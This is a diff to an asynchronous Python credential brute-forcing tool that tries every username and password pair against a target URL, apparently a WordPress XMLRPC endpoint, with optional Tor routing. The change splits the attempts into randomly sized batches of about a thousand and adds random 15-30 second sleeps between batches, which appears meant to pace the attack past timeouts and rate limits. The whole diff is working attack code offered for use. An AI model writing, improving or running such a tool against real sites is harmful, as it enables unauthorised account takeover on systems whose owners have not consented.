@@ -431,9 +431,8 @@ async def brute_force_task(url, username, password, session):
 # ==================================================================================================
 # ==================================================================================================
 
-async def progress_print(tasks: list[asyncio.Task], interval: float=1.0):
+async def progress_print(tasks: list[asyncio.Task], total: int):
     """Print progress while brute force attempts are executing"""
-    total = len(tasks)
     start = time.perf_counter()
     while True:
         done = sum(1 for t in tasks if t.done())
@@ -450,7 +449,7 @@ async def progress_print(tasks: list[asyncio.Task], interval: float=1.0):
             end='')
         if done >= total:
             break
-        await asyncio.sleep(interval)
+        await asyncio.sleep(1)
 
 # ==================================================================================================
 # ==================================================================================================
@@ -474,14 +473,13 @@ async def start_bruteforce_async(url, usernames, passwords, use_tor=False):
 
     # Create an aiohttp session with the connector
     async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = []  # List to hold all the asyncio tasks
+        brute_force_coros = []  # Using coroutines so work doesn't immediately start
 
-        monitor = asyncio.create_task(progress_print(tasks))
-        # Create brute force tasks for each username and password combination
+        # Create brute force coroutines for each username and password combination
         for username in usernames:
             for password in passwords:
-                # Create an asyncio task for each username-password pair
-                task = asyncio.create_task(
+                # Create an asyncio coroutine for each username-password pair
+                brute_force_coros.append(
                     brute_force_task(
                         url,
                         username,
@@ -489,11 +487,32 @@ async def start_bruteforce_async(url, usernames, passwords, use_tor=False):
                         session
                     )
                 )
-                tasks.append(task)  # Add the task to the list
+
+        tasks = []  # List of all the asyncio tasks for progress checking
+        monitor = asyncio.create_task(progress_print(tasks, len(brute_force_coros)))
+
+        # Chunk coroutines into a random number which should be small enough for XMLRPC to handle.
+        # TIME is the real issue - at almost exactly 5 minutes, everything consistently throws
+        # TimeoutErrors, but it was easier to deal with chunks of work then pausing based on time.
+        chunked_coros = []
+        min_chunk, max_chunk = 900, 1100
+        bfc_idx = 0
+        while bfc_idx < len(brute_force_coros):
+            chunk_size = random.randint(min_chunk, max_chunk)
+            chunked_coros.append(brute_force_coros[bfc_idx:bfc_idx+chunk_size])
+            bfc_idx += chunk_size
 
         try:
-            # Run all tasks concurrently
-            await asyncio.gather(*tasks, return_exceptions=True)  # Wait for all tasks to complete
+            print_colored_bold(f"Starting brute force attempts in random sized batches (~1000) with 15-30 second sleeps in between batches!", color="yellow")
+            for chunk_idx in range(len(chunked_coros)):
+                chunk = chunked_coros[chunk_idx]
+                # Tasks created separately so we can track progress
+                chunked_tasks = [asyncio.create_task(c) for c in chunk]
+                tasks.extend(chunked_tasks)
+                await asyncio.gather(*chunked_tasks, return_exceptions=True)  # Wait for all tasks to complete
+                # sleep only if not last chunk
+                if chunk_idx < len(chunked_coros) - 1: await asyncio.sleep(random.randint(15, 30))
+
         finally:
             await monitor
 
